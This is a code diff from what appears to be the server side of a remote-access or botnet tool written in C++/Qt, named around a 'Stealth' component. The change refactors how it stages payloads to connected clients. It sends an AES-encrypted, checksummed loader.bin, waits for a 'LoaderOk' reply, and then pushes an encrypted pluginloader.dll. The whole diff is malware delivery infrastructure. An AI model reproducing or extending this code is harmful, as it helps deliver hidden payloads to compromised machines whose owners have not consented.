@@ -7,31 +7,21 @@ ConnectionManager::ConnectionManager(Stealth* stealth,MessageManager* mngMessage
 
     connect(this,SIGNAL(connectionEstablished(Connection*)),this,SLOT(addConnection(Connection*)));
     connect(mngMessage,SIGNAL(receivedHandshake(Connection*)),this,SLOT(processHandshake(Connection*)));
+    connect(mngMessage,SIGNAL(receivedLoaderOk(Connection*)),this,SLOT(sendPluginManager(Connection*)));
 }
 
-void ConnectionManager::setupConnection(Connection *connection)
+void ConnectionManager::sendLoader(Connection *connection)
 {
+
     if(connection->getState()==Connection::JustConnected)
     {
         connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));
 
-        /* Carga desde el resource
-        QFile fileLoader(":/res/loader.bin");
-        QFile filePluginLoader(":/res/pluginloader.dll");
-        */
-
         /* Carga desde archivo */
         QFile fileLoader("loader.bin");
-        QFile filePluginLoader("pluginloader.dll");
-
         if(!fileLoader.open(QIODevice::ReadOnly)) return;
-        if(!filePluginLoader.open(QIODevice::ReadOnly)) return;
-
         QByteArray Loader=fileLoader.readAll();
-        QByteArray PluginLoader=filePluginLoader.readAll();
-
         fileLoader.close();
-        filePluginLoader.close();
 
         QByteArray checkSum=Crypto::FNV1a(Loader);
         Loader.insert(0,checkSum);
@@ -39,15 +29,26 @@ void ConnectionManager::setupConnection(Connection *connection)
 
         connection->write(connection->getIV().toByteArray()+crypted);
 
-        quint32 pluginmanagerSize=PluginLoader.size();
-        PluginLoader.insert(0,(char*)&pluginmanagerSize,4);
-        checkSum=Crypto::FNV1a(PluginLoader);
-        PluginLoader.insert(0,checkSum);
-        crypted=Crypto::AES(connection->getIV(),connection->getKey(),PluginLoader);
-        connection->write(crypted);
-
-        connection->setState(Connection::WaitingForGreeting);
+        connection->setState(Connection::WaitingForLoader);
     }
+}
+
+void ConnectionManager::sendPluginManager(Connection *connection)
+{
+    QFile filePluginLoader("pluginloader.dll");
+    if(!filePluginLoader.open(QIODevice::ReadOnly)) return;
+    QByteArray PluginLoader=filePluginLoader.readAll();
+    filePluginLoader.close();
+
+
+    quint32 pluginmanagerSize=PluginLoader.size();
+    PluginLoader.insert(0,(char*)&pluginmanagerSize,4);
+    QByteArray checkSum=Crypto::FNV1a(PluginLoader);
+    PluginLoader.insert(0,checkSum);
+    QByteArray crypted=Crypto::AES(connection->getIV(),connection->getKey(),PluginLoader);
+    connection->write(crypted);
+
+    connection->setState(Connection::WaitingForGreeting);
 }
 
 void ConnectionManager::processHandshake(Connection* connection)
